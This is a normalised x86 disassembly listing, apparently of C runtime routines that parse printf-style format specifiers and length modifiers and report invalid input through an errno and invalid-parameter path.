lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_42833f
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_41fc9f
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_4283bc
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_41fd00
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_4283bc
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_41fd61
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_4283bc
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_41ff18
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41dfca
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_41ff40
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x31 ] 0x2a
je r-xdata
call sub_4275ca
test al al
jne r-xdata
lea eax [ esi + 0x28 ]
push eax
call sub_41e026
pop esi
retn
mov ecx esi
call sub_41f37a
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x28 ] 0x0
jge r-xdata
or [ esi + 0x28 ] 0xffffffff
sub_41ff7a
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41e082
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_41ffa2
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41e0de
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_41ffca
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x31 ] 0x2a
je r-xdata
call sub_427680
test al al
jne r-xdata
lea eax [ esi + 0x28 ]
push eax
call sub_41e13a
pop esi
retn
mov ecx esi
call sub_41f390
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x28 ] 0x0
jge r-xdata
or [ esi + 0x28 ] 0xffffffff
sub_420004
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41e196
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_42002c
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41e1f2
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_420055
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x32 ] 0x2a
je r-xdata
call sub_427736
test al al
jne r-xdata
lea eax [ esi + 0x28 ]
push eax
call sub_41e250
pop esi
retn
mov ecx esi
call sub_41f3a6
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x28 ] 0x0
jge r-xdata
or [ esi + 0x28 ] 0xffffffff
sub_420090
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41e2ae
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_4200b9
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41e30c
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_4200e2
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x32 ] 0x2a
je r-xdata
call sub_4277ed
test al al
jne r-xdata
lea eax [ esi + 0x28 ]
push eax
call sub_41e36a
pop esi
retn
mov ecx esi
call sub_41f3bc
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x28 ] 0x0
jge r-xdata
or [ esi + 0x28 ] 0xffffffff
sub_42011d
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41e3c8
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_420146
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_4212a4
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_4202af
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_4214d3
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_420418
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_42170d
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_420581
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_42193c
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_4206ea
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_421b6b
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_420853
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_421da5
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_4209bc
movzx eax [ ecx + 0x32 ]
cmp eax 0x46
jne r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_421fd4
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
push 0x6c
pop edx
cmp eax edx
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
add eax 0x2
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
movzx eax [ edx ]
cmp eax 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp eax 0x36
jne r-xdata
cmp [ edx + 0x2 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp eax 0x64
je r-xdata
cmp [ edx + 0x2 ] 0x34
jne r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
push 0x68
pop edx
cmp eax edx
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp eax 0x69
je r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
add eax 0x2
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x78
je r-xdata
cmp eax 0x58
jne r-xdata
sub_420b38
movzx eax [ ecx + 0x32 ]
cmp eax 0x46
jne r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_422231
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
push 0x6c
pop edx
cmp eax edx
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
add eax 0x2
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
movzx eax [ edx ]
cmp eax 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp eax 0x36
jne r-xdata
cmp [ edx + 0x2 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp eax 0x64
je r-xdata
cmp [ edx + 0x2 ] 0x34
jne r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
push 0x68
pop edx
cmp eax edx
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp eax 0x69
je r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
add eax 0x2
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x78
je r-xdata
cmp eax 0x58
jne r-xdata
sub_420cb4
movzx eax [ ecx + 0x32 ]
cmp eax 0x46
jne r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_42249d
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
push 0x6c
pop edx
cmp eax edx
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
add eax 0x2
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
movzx eax [ edx ]
cmp eax 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp eax 0x36
jne r-xdata
cmp [ edx + 0x2 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp eax 0x64
je r-xdata
cmp [ edx + 0x2 ] 0x34
jne r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
push 0x68
pop edx
cmp eax edx
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp eax 0x69
je r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
add eax 0x2
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x78
je r-xdata
cmp eax 0x58
jne r-xdata
sub_420e30
movzx eax [ ecx + 0x32 ]
cmp eax 0x46
jne r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_4226fa
